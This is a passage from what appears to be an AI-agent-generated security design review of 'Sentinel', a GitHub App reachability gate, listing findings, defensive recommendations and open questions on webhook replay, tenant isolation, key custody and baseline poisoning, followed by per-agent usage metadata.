**Likelihood:** Medium. Warn mode is explicitly a risk vector. The race condition depends on refresh latency. However, the impact is severe: a poisoned baseline is a persistent blind spot, and detecting it requires manual baseline audits.

**Recommendation:** 1) Never auto-accept new paths into the baseline without review. On baseline refresh, diff old vs. new; require manual approval (via PR to a checked-in .entrygraph/baseline.json) for any new high-risk paths. 2) Make warn mode explicit and temporary: require a policy flag with an expiration date; alert weekly that the gate is not enforcing. 3) Use an atomic compare-and-swap for baseline updates: if base_sha changed since scan start, retry. 4) Log all baseline mutations with actor/reason. 5) Implement a 'baseline audit' command that re-scans main and compares to stored baseline, flagging drift. 6) For critical repos, require dual approval for suppressions. 7) Alert on baseline path count increases >10%.

**References:** CWE-367: Time-of-check Time-of-use (TOCTOU) Race Condition, CWE-1270: Generation of Incorrect Security Tokens, MITRE ATT&CK T1562.001: Impair Defenses - Disable or Modify Tools, OWASP ASVS 4.0.3 - V1.14: Configuration Verification

#### [MEDIUM] Suppression API without strict authorization allows PR authors to bypass their own findings

The Suppression table allows marking specific fingerprints as accepted. The design doc states 'time-boxed suppressions with required reason' and 'suppressions require review via CODEOWNERS on a checked-in policy file,' but also proposes a REST API for suppressions. If the API allows creating suppressions without strong authorization (e.g., any GitHub user with repo write access can POST), a PR author could suppress findings in their own PR, defeating the gate. Even with CODEOWNERS enforcement on checked-in files, the API could bypass this. The expires_at field helps but does not prevent initial abuse.

**Likelihood:** Medium. This depends on how the suppression API authorization is implemented (not specified in the design doc). If it's a simple 'check repo write permission' without CODEOWNERS involvement, it's trivially bypassable. If suppressions are only allowed via PR to .entrygraph/policy.yml, the risk is lower but requires implementation discipline.

**Recommendation:** 1) Require suppressions to be checked into the repo as .entrygraph/suppressions.yml, protected by CODEOWNERS. The API should only read/validate, not create. 2) If the API must create suppressions (for UI convenience), require an approval flow: submitter proposes, owner approves, both recorded in reason field. 3) Restrict suppression creation to org admins or a dedicated security team role, not PR authors. 4) Audit log every suppression with actor and reason. 5) Alert security team on new suppressions. 6) Enforce short expiration (30 days default); require re-approval on expiry. 7) Implement a 'suppression review' report: list all active suppressions with age and last-revalidated date.

**References:** CWE-285: Improper Authorization, OWASP Top 10 - A01:2021 Broken Access Control, MITRE ATT&CK T1562.001: Impair Defenses - Disable or Modify Tools, CIS Control 6.8: Define and Maintain Role-Based Access Control

#### [MEDIUM] Replay attack via missing or unbounded X-GitHub-Delivery deduplication

The design doc states 'dedupe on X-GitHub-Delivery' to prevent replay attacks. However, if the deduplication store is memory-only (lost on worker restart) or uses an unbounded cache (memory exhaustion), an attacker can replay old webhooks after a restart or flood with unique delivery IDs. Additionally, if the deduplication window is unbounded, the cache grows indefinitely. A replayed webhook from days/weeks ago could trigger scans of old commits, wasting resources or causing confusion (e.g., a Check Run posted to a closed PR).

**Likelihood:** Medium. Replay attacks are common if deduplication is naive (e.g., an in-memory set that resets on restart). The design doc does not specify the deduplication store or window.

**Recommendation:** 1) Store seen delivery IDs in Redis with a TTL (24 hours) or in Postgres with a cleanup job. 2) Reject events older than 5 minutes based on event timestamp vs. server time (in addition to deduplication). 3) Monitor delivery ID collision attempts (same ID, different payload). 4) Test replay resilience: send the same webhook twice, assert only one scan runs.

**References:** CWE-294: Authentication Bypass by Capture-replay, OWASP API Security - API4:2023 Unrestricted Resource Consumption, NIST SP 800-63B - 5.2.8: Replay Resistance

#### [MEDIUM] Unvalidated repo_id or installation_id from webhook enables scan of unauthorized repos

The webhook payload contains installation.id and repository.id. If the worker trusts these values without cross-checking against the installation's authorized repository set (fetched via GitHub API using the installation token), an attacker who controls one installation could craft a webhook (or exploit a compromised webhook secret) to trigger scans of repos in a different installation. This could leak findings from another org or cause resource exhaustion by scanning massive repos.

**Likelihood:** Low to Medium. Requires webhook forgery (critical finding #1) or a bug in webhook handling. However, the impact is significant: cross-tenant action.

**Recommendation:** 1) After receiving a webhook, fetch the installation's repository list via GitHub API (/installation/repositories) and validate the repo_id is in that set. 2) Reject the webhook if validation fails. 3) Implement this check even if HMAC is valid (defense-in-depth). 4) Log validation failures for investigation. 5) Test: send webhook with valid HMAC but repo_id from a different installation, assert rejection.

**References:** CWE-639: Authorization Bypass Through User-Controlled Key, OWASP API Security - API1:2023 Broken Object Level Authorization, GitHub Apps Best Practices: https://docs.github.com/en/apps/creating-github-apps/setting-up-a-github-app/best-practices-for-creating-a-github-app

#### [MEDIUM] Sensitive information disclosure via overly detailed error messages or logs

During webhook processing, git fetch, parsing, or GitHub API calls, errors may contain sensitive information: clone URLs with embedded tokens, file paths, internal hostnames, or code snippets. If these are logged unredacted or returned in API responses, they could leak to attackers (via log aggregation dashboards, error tracking services like Sentry, or API responses in multi-tenant scenarios). The design doc mentions 'never log the key' but does not address general secret/PII redaction.

**Likelihood:** Medium. Common misconfiguration. Developers often log full exception traces or API responses for debugging.

**Recommendation:** 1) Redact all tokens (installation tokens, JWTs, webhook secrets) from logs and error messages using a regex-based filter. 2) Log exception types and sanitized messages, not full tracebacks with variable values. 3) Scrub file paths to relative paths from repo root, not absolute host paths. 4) Never log webhook payloads or API responses in full; log only metadata (event type, delivery ID, repo ID). 5) Use structured logging (JSON) with explicit inclusion of safe fields, not blanket payload dumps. 6) If using an error tracker, configure allowlist of error types to report; exclude auth failures with tokens.

**References:** CWE-209: Generation of Error Message Containing Sensitive Information, CWE-532: Insertion of Sensitive Information into Log File, OWASP Logging Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html, NIST SP 800-53 AU-13: Monitoring for Information Disclosure

#### [MEDIUM] Supply chain risk in FastAPI, arq, dulwich, PyJWT, or tree-sitter language packs

Sentinel introduces dependencies (FastAPI, arq, dulwich, PyJWT) that expand the attack surface. If any of these are compromised (e.g., a malicious maintainer publishes a backdoored version, a dependency confusion attack substitutes a private package, or a vulnerability is discovered), the Sentinel service is compromised. Tree-sitter language packs are also a vector: they are native code (C bindings) and a malicious language pack could execute arbitrary code during parse. The design doc states 'Pin + hash-lock via uv; keep service deps behind the sentinel extra; Dependabot + SBOM' but does not specify provenance verification or regular audits.

**Likelihood:** Low for direct compromise of mainstream packages (FastAPI, PyJWT), but supply chain attacks are increasing. Medium for lesser-known language packs or transitive dependencies.

**Recommendation:** 1) Pin all dependencies with hash locks in requirements.txt or uv.lock. 2) Use Dependabot or Renovate with auto-merge only for patch versions, review minor/major updates. 3) Generate and publish an SBOM (Software Bill of Materials) for Sentinel; scan it with Grype or Trivy. 4) Verify package signatures where available (e.g., PEP 740 for PyPI). 5) Audit new language pack additions: review the grammar and C code, compare checksums to official releases. 6) Run CI with --require-hashes and fail if a hash mismatches. 7) Monitor for known vulnerabilities in dependencies via GitHub Security Advisories or Snyk. 8) Minimize dependencies: evaluate if dulwich can be replaced with a simpler git wrapper, or if arq is truly needed vs. a simpler queue.

**References:** CWE-1329: Reliance on Component That is Not Updateable, OWASP Top 10 - A06:2021 Vulnerable and Outdated Components, MITRE ATT&CK T1195.001: Supply Chain Compromise - Compromise Software Dependencies and Development Tools, SLSA Supply Chain Levels: https://slsa.dev, NIST SSDF: Secure Software Development Framework

#### [LOW] Check Run status manipulation causes confusion or bypasses external gates

Sentinel posts Check Runs to GitHub with pass/fail status. If an attacker can forge webhooks (see finding #1) or exploit a bug in the status determination logic (e.g., a suppressed finding incorrectly counted as passed), they can manipulate the Check Run to show green when dangerous paths exist. This bypasses the gate if branch protection relies solely on the Check Run status. Additionally, if the gate is in 'warn' mode but the Check Run still shows green, developers may ignore it.

**Likelihood:** Low. Requires webhook forgery or a logic bug. GitHub's branch protection can be configured to require specific checks, which mitigates this if the check name is verified.

**Recommendation:** 1) Use a unique, hard-to-forge Check Run name (e.g., 'Entrygraph Reachability Gate (<installation_id>)'). 2) Verify the Check Run status logic: assert that new findings above threshold → failure, regardless of suppression count. 3) Document the branch protection setup: require the specific Check Run name, not just 'any check.' 4) In warn mode, post a 'neutral' status (yellow), not success (green), to signal non-enforcement. 5) Add an API endpoint to manually re-run a scan and update the Check Run, requiring admin auth.

**References:** CWE-451: User Interface (UI) Misrepresentation of Critical Information, OWASP ASVS 4.0.3 - V14: Configuration Verification, GitHub Checks API: https://docs.github.com/en/rest/checks

**Recommendations:**

- Implement a comprehensive secret rotation runbook and test it quarterly. Document the full rotation procedure for webhook secret, GitHub App private key, database credentials, and Redis password.
- Deploy a dedicated egress proxy (e.g., Squid or a cloud NAT gateway with strict allow-lists) for all worker outbound traffic. Block RFC1918, loopback, link-local, and cloud metadata IPs at the network layer, not just in application logic.
- Run the scan worker in a hardened sandbox: read-only root filesystem, no network except git fetch, seccomp profile, memory/CPU limits via cgroups, and unprivileged user. Use a minimal base image (distroless or scratch + statically linked binary).
- Establish a bug bounty or responsible disclosure program before public launch. Reachability gates are high-impact (block merges) and handle untrusted input (PRs), making them attractive targets.
- Implement comprehensive audit logging: every webhook, scan start/end, baseline mutation, suppression created/expired, policy change, and API call with actor. Retain logs for 90 days and ship to a SIEM.
- Conduct a pre-launch security review: threat modeling session, penetration test focusing on multi-tenant isolation and webhook authentication, and code audit of authorization checks.

**Open Questions:**

- What is the webhook secret rotation procedure, and how is downtime avoided during rotation (both old and new secrets must be accepted temporarily)?
- How is the GitHub App private key provisioned in production (environment variable, mounted secret, secret manager API)? What protections exist against accidental logging or memory dumps?
- What is the specific deduplication mechanism for X-GitHub-Delivery (in-memory set, Redis with TTL, database)? What is the retention window, and how is it bounded to prevent memory exhaustion?
- How is installation_id derived and validated in API requests? Is it extracted from the JWT token after signature verification, or trusted from a request parameter?
- What are the concrete resource limits for the scan worker (CPU, memory, max parse time per file, max total files, max graph nodes)? Are these enforced with hard kills or soft limits?
- What is the egress network policy for the worker? Is there a deny-by-default firewall, allow-list proxy, or network namespace isolation?
- How are suppressions authorized in the REST API? Is it a simple 'repo write permission' check, or is there integration with CODEOWNERS or an approval workflow?
- What is the baseline refresh atomicity? If two PRs merge simultaneously to main, can they cause a race condition where both refresh against the same stale baseline?
- What testing exists for fingerprint stability across refactors? Are there golden-repo regression tests, and how comprehensive are they (cover rename, move, extract function, reorder parameters)?
- What is the data retention policy for scan graphs and findings? How long are they stored, and how are they securely purged (especially for deleted repos or uninstalled apps)?
- What is the plan for securely handling GitHub App installation tokens in the worker (lifetime, caching, revocation on job failure, secure deletion from memory)?
- How is the worker protected against zip bombs or other decompression attacks if the git fetch includes submodules or large binary files?

### Security Architect

The Continuous Reachability Gate architecture introduces a CI enforcement surface that processes untrusted PR code and maintains multi-tenant state. While the design thoughtfully addresses several threat vectors (HMAC verification, installation-scoped tokens, no code execution), it creates critical new trust boundaries around webhook handling, untrusted repository processing, and multi-tenant data isolation. The worker component becomes a high-value attack target that must parse adversarial input, and the GitHub App credentials represent a single point of compromise across all installations. Key architectural gaps include insufficient defense-in-depth around the worker sandbox, underspecified API authentication, missing audit trail, and weak isolation guarantees in the multi-tenant Sentinel deployment.

**Confidence:** high

#### [CRITICAL] GitHub App private key is a single point of total compromise

The GitHub App's private key (used to mint JWTs that obtain installation tokens) is the cryptographic root of trust for the entire system. Compromise of this key grants an attacker the ability to impersonate the app across every installation, accessing all repos the app is installed on, posting arbitrary Check Runs, and uploading malicious SARIF to poison code scanning results. The spec mentions 'secrets from env/secret manager only' and 'key rotation runbook' but provides no architectural controls to limit blast radius if compromise occurs. All workers and API servers presumably need access to this key, expanding the attack surface. There's no mention of HSM usage, key ceremony, or cryptographic attestation.

**Likelihood:** High-value secrets in environment variables are vulnerable to memory dumps, log leaks, and infrastructure compromise. The more components that require the key, the larger the attack surface. Without HSM or segmentation, a single compromised worker or API server leaks the key.

**Recommendation:** Architectural controls to limit blast radius: (1) Store the private key in a Hardware Security Module (HSM) or KMS with audit logging; API servers/workers call the HSM to sign JWTs rather than holding the key in-process. (2) Implement short-lived intermediate signing keys: the root key signs 1-hour-TTL intermediate keys that workers use; rotate intermediates automatically; root key is only accessed by a dedicated signing service, not workers. (3) Separate the signing service from the worker pool (different network segments, distinct IAM roles). (4) Emit structured audit logs (to a separate, append-only store) for every JWT signed, including caller identity and repo accessed. (5) Implement anomaly detection on JWT issuance rate and accessed repos. (6) Document and test a key rotation procedure with <1 hour RTO. (7) Consider per-installation scoped keys if GitHub's App model supports it.

**References:** CWE-321: Use of Hard-coded Cryptographic Key, CWE-522: Insufficiently Protected Credentials, MITRE ATT&CK T1552.001: Credentials in Files, NIST SP 800-57: Key Management, GitHub Apps Security Best Practices

#### [HIGH] Worker parsing untrusted PR code lacks defense-in-depth sandboxing

The scan worker parses untrusted repository contents from PRs using tree-sitter. While the spec correctly notes 'entrygraph never executes code,' parsing itself is a trust boundary. Tree-sitter parsers are complex C/Rust code that could contain vulnerabilities (buffer overflows, logic bugs) exploitable via maliciously crafted source files. The proposed mitigations (file size caps, time budgets, read-only FS) are single-layer defenses. If a parser vulnerability exists, a malicious PR could escape the container, exfiltrate GitHub App tokens from the worker's environment, or pivot to adjacent infrastructure (Redis, Postgres).

**Likelihood:** Tree-sitter has a good security track record, but any complex parser is a potential vulnerability surface. The likelihood increases with the number of languages supported and frequency of parser updates. The impact is severe because worker compromise yields installation tokens valid across all repos the app can access.

**Recommendation:** Implement layered isolation: (1) Run workers in minimal, ephemeral containers with no persistent state; (2) Use seccomp/AppArmor profiles restricting syscalls to the minimum (no exec, minimal network); (3) Deploy workers in a separate network segment with strict egress filtering (only GitHub API IPs); (4) Consider per-scan disposable VMs or gVisor for kernel-level isolation; (5) Rotate installation tokens aggressively (fetch immediately before GitHub API calls, discard after); (6) Implement worker health checks that kill runaway processes; (7) Fuzz tree-sitter parsers with pathological inputs as part of your CI.

**References:** CWE-94: Improper Control of Generation of Code, CWE-502: Deserialization of Untrusted Data (parsing is similar), MITRE ATT&CK T1055: Process Injection, OWASP ASVS 5.1.1: Input Validation Architecture

#### [HIGH] Multi-tenant data isolation relies solely on application-layer enforcement

Sentinel stores findings, baselines, and scan results for multiple GitHub organizations in a shared Postgres database. The spec states 'every query scoped by installation_id / repo_id' and 'row-level authorization checks,' but this is application-layer enforcement with no defense-in-depth. A SQL injection vulnerability, ORM bypass, or privilege escalation in the API/worker code could leak one tenant's code graphs and findings to another. There's no mention of database-level isolation (Postgres schemas per tenant, RLS policies) or cryptographic isolation (per-tenant encryption keys). The shared Redis queue is also a potential cross-tenant information leak if job metadata isn't properly scrubbed.

**Likelihood:** Application-layer authz bugs are common in multi-tenant systems. The likelihood increases with code complexity, ORM usage, and the number of contributors. The impact is severe because findings expose the structure and vulnerabilities of customer source code (sensitive IP).

**Recommendation:** Implement layered isolation: (1) Enable Postgres Row-Level Security (RLS) policies that enforce installation_id/repo_id predicates at the database layer, independent of application code. (2) Use separate Postgres schemas per tenant or consider per-tenant databases if scale allows; this provides blast-radius containment. (3) Encrypt sensitive columns (path_json, findings) with per-tenant keys stored in a KMS; a compromise of the DB yields only encrypted data for other tenants. (4) API/worker DB connections should use distinct Postgres roles with minimal grants; workers only INSERT/SELECT their own jobs. (5) Redis job payloads must not contain sensitive data; use opaque job IDs that workers dereference from Postgres after authz checks. (6) Implement integration tests that attempt cross-tenant queries and assert they fail. (7) Regular penetration testing focused on tenant isolation. (8) Audit all raw SQL and ensure ORM queries include tenant predicates.

**References:** CWE-566: Authorization Bypass Through User-Controlled SQL Primary Key, CWE-639: Authorization Bypass Through User-Controlled Key, OWASP Top 10 A01:2021 - Broken Access Control, NIST SP 800-204: Multi-Tenant Security Considerations, Postgres Row-Level Security documentation

#### [HIGH] API authentication and authorization scheme is unspecified

The spec describes a REST API (sentinel/api.py) for scans, findings, suppressions, and policy but does not specify how API clients authenticate or how authorization is enforced. If the API is meant for web UI access, manual queries, or integrations, it represents a new attack surface. Without strong authn/authz, an attacker could query arbitrary repos' findings, modify suppressions, or tamper with policies. The API likely needs to operate in the context of a GitHub user or installation, but the mechanism is unstated. If the API uses bearer tokens, how are they issued, rotated, and revoked? Are they scoped per installation/repo? The absence of this in the architecture is a significant gap.

**Likelihood:** Unspecified security controls are commonly implemented weakly or inconsistently. Without a clear design, developers may choose convenience over security (e.g., simple API keys with broad scope, no expiration).

**Recommendation:** Define and document the API authentication architecture: (1) API clients authenticate via GitHub OAuth (user-to-server tokens) so API access inherits GitHub's permission model; map GitHub org/repo membership to Sentinel installation/repo access. (2) Alternatively, use GitHub App installation tokens (if API calls are server-to-server). (3) All API requests must include installation_id and/or repo_id; enforce that the authenticated principal has access to that installation (query GitHub's API to verify membership). (4) Implement scoped, short-lived JWT tokens for API access; tokens include installation_id claims. (5) API rate limiting per client and per installation. (6) Audit logging for all API mutations (suppression create/delete, policy changes). (7) CORS policy if the API serves a browser-based UI; restrict origins to known deployments. (8) Document threat model: who calls this API, from where, and what data do they access?

**References:** CWE-306: Missing Authentication for Critical Function, CWE-862: Missing Authorization, OWASP API Security Top 10 API2:2023 - Broken Authentication, OWASP API Security Top 10 API1:2023 - Broken Object Level Authorization

#### [MEDIUM] Baseline update mechanism creates a TOCTOU race for baseline poisoning

The spec states 'baselines only refresh from the protected default branch after merge,' but the sequence is: (1) PR scanned against baseline_v1, (2) PR merges to main, (3) baseline updated to baseline_v2. If a malicious actor merges a PR that introduces a dangerous path, then immediately triggers a baseline refresh (or it happens automatically), that path becomes 'known' and won't gate future PRs. The window for poisoning is narrow but exists: get one bad PR merged (via social engineering, compromised maintainer, or subtle payload that passes review), and the gate accepts it as the new normal. There's no mention of baseline audit, rollback, or automated detection of 'baseline suddenly accepts 50 new high-risk paths' anomalies.

**Likelihood:** Requires an attacker to merge a malicious PR past code review and branch protection, which is harder than pure technical exploit but possible in under-resourced or compromised projects. The impact is that the gate loses effectiveness after the initial poisoning.

**Recommendation:** Implement baseline integrity controls: (1) Baselines are immutable; updates create new baseline versions with audit history (who, when, what changed). (2) Baseline updates are not automatic; require manual approval or a separate privileged action. (3) Implement anomaly detection: if a baseline update adds >N new paths or increases avg risk by >X%, flag for manual review before accepting. (4) Store baseline diffs in a tamper-evident log (append-only, signed). (5) Provide a CLI command to compare baselines and audit what changed. (6) Integrate baseline approval into the same CODEOWNERS/review process as suppression file changes. (7) Consider a 'grace period' where newly merged paths are still flagged as 'recently added' for M days.

**References:** CWE-367: Time-of-check Time-of-use (TOCTOU) Race Condition, MITRE ATT&CK T1562.001: Disable or Modify Tools, NIST SP 800-53 CM-3: Configuration Change Control

#### [MEDIUM] Webhook processing lacks rate limiting and can be weaponized for DoS

The webhook receiver enqueues a scan job for every pull_request (opened/synchronize) event. An attacker with write access to a repo (or who compromises a contributor account) can open hundreds of PRs or force-push to a PR repeatedly, flooding the queue with scan jobs. Each job fetches the repo, indexes it, and computes reachability—resource-intensive operations. If the worker pool is finite (which it must be), this creates a queue backlog that delays legitimate scans or exhausts worker resources. The spec mentions HMAC verification (preventing external spoofing) but no rate limiting per installation or repo. Redis queue can also grow unbounded if jobs arrive faster than workers process them.

**Likelihood:** Moderate: requires an attacker with repo write access or a compromised account, but GitHub's permission model makes 'triage' or 'write' access common. The impact is availability loss for all repos on the Sentinel instance.

**Recommendation:** Implement multi-layer rate limiting: (1) Per-repo rate limit: max N scans per hour per repo; reject or defer excess webhooks with a 429 response. (2) Per-installation rate limit: max total scans across all repos in an org. (3) Queue depth limits: if Redis queue depth exceeds threshold, reject new jobs (fail-open: post a Check Run saying 'queue full, try again later'). (4) Worker autoscaling with caps: scale up to M workers, then shed load. (5) Dedupe aggressive: if a PR already has a queued/running scan for commit X, drop the duplicate webhook. (6) Implement 'exponential backoff' for noisy repos: if a repo triggers >X scans in Y minutes, delay subsequent scans. (7) Monitor and alert on queue depth, scan duration outliers, and repeated scans for the same commit.

**References:** CWE-770: Allocation of Resources Without Limits or Throttling, OWASP API Security Top 10 API4:2023 - Unrestricted Resource Consumption, MITRE ATT&CK T1499: Endpoint Denial of Service

#### [MEDIUM] No audit logging strategy for security-critical actions

The architecture lacks a defined audit trail for security-critical operations: suppression creation/deletion, policy changes, baseline updates, GitHub App key usage (JWT signing), API access, and worker scan execution. Audit logs are essential for incident response (detecting compromise), compliance (SOC 2, GDPR mentioned), and forensic analysis. Without structured, tamper-evident logs, the team cannot answer 'who changed this suppression?' or 'was the GitHub App key used anomalously?'. The spec mentions 'audit logging' once in the GitHub App key mitigation section but doesn't integrate it into the architecture.

**Likelihood:** Audit logging is often an afterthought, added reactively after an incident. The impact is delayed detection of compromise and inability to reconstruct attacker actions post-breach.

**Recommendation:** Design a centralized audit logging subsystem: (1) All security-critical actions emit structured audit events (JSON) with: timestamp, actor (user/service), action, resource (repo_id, fingerprint, etc.), outcome, source IP/context. (2) Events include: suppression CRUD, policy updates, baseline refresh, JWT signing (with repo accessed), API mutations, worker scan start/end, webhook receipt. (3) Logs are written to an append-only, immutable store (e.g., AWS CloudWatch Logs, GCP Logging, or a dedicated Postgres table with insert-only permissions). (4) Logs are retained per compliance requirements (e.g., 1 year). (5) Implement alerting on anomalies: unusual access patterns, policy changes outside business hours, suppression of high-severity findings. (6) Provide a query interface for audit log search (for security team and customers). (7) Include audit logging in the threat model and acceptance criteria.

**References:** CWE-778: Insufficient Logging, OWASP ASVS 7.1: Log Content Requirements, NIST SP 800-53 AU-2: Audit Events, MITRE ATT&CK T1562.002: Disable or Modify System Logs

#### [MEDIUM] Fingerprint stability assumption may not hold under refactoring, causing false negatives

The fingerprint is designed to be stable across line moves by hashing semantic content (qnames, not line numbers). However, refactors that change symbol qualified names—renaming functions, moving them between modules, or extracting inner functions—will produce different fingerprints. The spec introduces an 'endpoint' fingerprint (source + sink only) as a fuzzy fallback, but this can collide: two distinct paths from the same entrypoint to the same sink will share an endpoint fingerprint. A sophisticated attacker could refactor a dangerous path (rename intermediate functions) to change the strict fingerprint, causing the gate to flag it as 'new' and requiring re-review, or worse, causing it to be ignored if suppressions are keyed to the old fingerprint. Conversely, two legitimately different paths could be conflated if they share endpoints.

**Likelihood:** Refactoring is common in active codebases. The fuzzy fallback reduces false positives but introduces false negatives (missed detections) and false positives (incorrect 'same path' matches). The security impact is that the gate's effectiveness degrades as code evolves.

**Recommendation:** Strengthen fingerprint stability and collision handling: (1) Include a 'structural' fingerprint variant that captures path shape (e.g., graph edit distance, token sequence similarity) to detect refactored paths. (2) When diffing, if a 'new' path's endpoint fingerprint matches a 'fixed' path, flag it as 'potentially moved' and require explicit review. (3) Implement a reconciliation mode that presents humans with side-by-side path comparisons when fingerprints diverge. (4) Log fingerprint collisions (multiple paths → same endpoint fingerprint) and alert if collision rate exceeds threshold. (5) Test fingerprint stability with a corpus of common refactorings (rename, extract method, inline, move) and assert that paths are correctly tracked or flagged. (6) Document fingerprint limitations clearly so users understand when manual review is required. (7) Consider machine learning-based code similarity if heuristics prove insufficient.

**References:** CWE-696: Incorrect Behavior Order, OWASP ASVS 14.1.3: Build Process Security

#### [LOW] SARIF upload to GitHub code scanning creates a trust dependency on GitHub's ingestion

The gate uploads findings to GitHub code scanning via SARIF. This creates a trust dependency: GitHub's code scanning ingestion becomes part of the security control surface. If GitHub's SARIF processor has a bug, misinterprets findings, or throttles uploads, the gate's visibility is impaired. Additionally, SARIF allows embedding URIs and markdown; malicious SARIF (from a compromised worker) could inject XSS payloads or phishing links into the code scanning UI. While GitHub likely sanitizes SARIF, the gate should not assume this.

**Likelihood:** GitHub's code scanning is mature, but bugs exist in all software. The impact is limited because the gate still blocks via Check Run status, but SARIF is a supplementary defense.

**Recommendation:** Validate SARIF before upload: (1) Schema-validate generated SARIF against the 2.1.0 JSON schema. (2) Sanitize all user-controlled fields (e.g., path_json hop descriptions) to prevent injection of markdown/HTML/URLs that could be misinterpreted by GitHub's renderer. (3) Limit SARIF size (max findings, max message length) to prevent DoS of GitHub's ingestion. (4) Monitor SARIF upload success rate; alert if uploads start failing (indicates GitHub API issue or adversarial input). (5) Provide a fallback: if SARIF upload fails, ensure findings are still visible in the Check Run and Sentinel API. (6) Document that SARIF is a 'best-effort' visibility enhancement, not the primary control; the Check Run pass/fail is authoritative.

**References:** CWE-79: Cross-site Scripting (XSS), OWASP Top 10 A03:2021 - Injection, SARIF 2.1.0 Specification

**Recommendations:**

- Adopt a zero-trust architecture for the worker: treat every PR scan as processing adversarial input. Workers should be ephemeral, heavily sandboxed, and unable to access long-lived credentials directly.
- Implement cryptographic segmentation for the GitHub App key: use HSM or KMS with short-lived intermediate signing keys so that no single component compromise yields the root key.
- Enforce multi-layer tenant isolation: combine application-layer authz with database RLS, per-tenant encryption, and network segmentation to ensure no single bug leaks cross-tenant data.
- Design audit logging into the architecture from day one: all security-critical actions (suppression, policy, baseline, key usage) must emit tamper-evident logs with anomaly detection.
- Develop a threat model document that explicitly maps attack vectors (malicious PR, compromised webhook, stolen key, rogue API client) to architectural controls; test each control with adversarial scenarios.
- Implement chaos engineering for security: periodically inject malicious PRs, replayed webhooks, and cross-tenant queries into a staging environment and verify that defenses hold.

**Open Questions:**

- What is the API's authentication and authorization scheme? Is it GitHub OAuth, installation tokens, or a separate credential system?
- How is the GitHub App webhook secret rotated without downtime? Is there support for multiple concurrent secrets during rollover?
- What is the retention policy for scan results, findings, and code graphs? Are they purged automatically, and how does this interact with compliance requirements?
- How does the system handle a compromised GitHub App installation (e.g., malicious org admin)? Can one installation's compromise pivot to others?
- What is the resource model for the worker pool? Auto-scaling limits, per-scan memory/CPU caps, queue prioritization strategy?
- How are supply-chain risks in tree-sitter language packs managed? Are parsers pinned, audited, or sandboxed independently?
- What happens if a scan is running when a PR is merged? Is there a state machine for handling concurrent baseline updates?
- Can suppressions be scoped to branches, or are they repo-wide? How does this interact with long-lived feature branches?
- What is the observability strategy? Metrics for scan latency, worker health, queue depth, baseline drift, fingerprint collision rate?
- How is secrets management handled for the optional 'per-tenant encryption keys' in the multi-tenant recommendation? Does this require customer key management?

### Incident Response / DFIR Engineer

_Assessment failed: TimeoutError: _

## Usage Metadata

### Per Agent

| Role | Model | Requests | Input | Output | Duration (s) |
| --- | --- | ---: | ---: | ---: | ---: |
| triage | copilot:claude-sonnet-4.5 | 1 | 5723 | 1826 | 37.5 |
| product-security | copilot:claude-sonnet-4.5 | 1 | 5320 | 5670 | 121.3 |
| appsec | copilot:claude-sonnet-4.5 | 1 | 5335 | 6085 | 123.0 |
| supply-chain | copilot:claude-sonnet-4.5 | 1 | 5316 | 5652 | 120.5 |
| threat-model | copilot:claude-sonnet-4.5 | 1 | 5325 | 5515 | 115.8 |
| cloudsec | copilot:claude-sonnet-4.5 | 1 | 5317 | 6021 | 122.4 |
| iam | copilot:claude-sonnet-4.5 | 1 | 5317 | 4217 | 91.2 |
| pentest | copilot:claude-sonnet-4.5 | 1 | 5320 | 7833 | 162.9 |
| security-architect | copilot:claude-sonnet-4.5 | 1 | 5310 | 5939 | 126.2 |
| incident-response | copilot:claude-sonnet-4.5 | 0 | 0 | 0 | 300.0 |
| synthesis | copilot:claude-sonnet-4.5 | 1 | 7450 | 2108 | 42.6 |

### Totals by Model

| Model | Requests | Input | Output | Cache Read | Cache Write |
| --- | ---: | ---: | ---: | ---: | ---: |
| copilot:claude-sonnet-4.5 | 10 | 55733 | 50866 | 0 | 55633 |
| **all** | **10** | **55733** | **50866** | **0** | **55633** |
